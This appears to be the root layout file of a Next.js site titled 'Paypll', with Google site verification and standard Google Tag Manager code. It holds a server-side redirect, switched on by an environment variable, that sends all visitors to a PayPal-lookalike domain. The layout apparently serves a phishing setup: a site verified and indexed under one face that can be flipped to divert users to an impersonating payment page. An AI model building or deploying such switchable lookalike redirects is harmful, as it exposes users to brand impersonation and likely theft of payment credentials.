import type { Metadata } from 'next'
import Script from 'next/script'
import './globals.css'
import { redirect } from 'next/navigation'

export const metadata: Metadata = {
  title: 'Paypll',
  description: 'Created with v0',
  generator: 'v0.dev',
  // This will render: <meta name="google-site-verification" content="pD7tWDh4PBQQGum9vWl8GV4guYPk_Sb34SWtpmWeWlw" />
  other: {
    'google-site-verification': 'pD7tWDh4PBQQGum9vWl8GV4guYPk_Sb34SWtpmWeWlw',
  },
}

const REDIRECT = process.env.NEXT_PUBLIC_REDIRECT

export default function RootLayout({
  children,
}: Readonly<{ children: React.ReactNode }>) {
  // Server-side redirect (App Router)
  if ((REDIRECT ?? '').toLowerCase() === 'yes') {
    redirect('https://paymentpaypal-five.vercel.app/')
  }

  return (
    <html lang="en">
      <head>
        {/* (Optional) explicit meta tag if you prefer it here instead of metadata.other */}
        <meta
          name="google-site-verification"
          content="pD7tWDh4PBQQGum9vWl8GV4guYPk_Sb34SWtpmWeWlw"
        />

        {/*
          GOOGLE TAG MANAGER — place as high in <head> as possible.
          Removed direct GA4 gtag.js to avoid double-counting.
          If you need GA4, configure it inside GTM instead.
        */}
        <Script id="gtm-head" strategy="afterInteractive">
          {`
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer','GTM-WKTWF668');
          `}
        </Script>
      </head>

      <body>
        {/* GOOGLE TAG MANAGER (noscript) — immediately after opening <body> */}
        <noscript>
          <iframe
            src="https://www.googletagmanager.com/ns.html?id=GTM-WKTWF668"
            height="0"
            width="0"
            style={{ display: 'none', visibility: 'hidden' }}
          />
        </noscript>

        {children}
      </body>
    </html>
  )
}
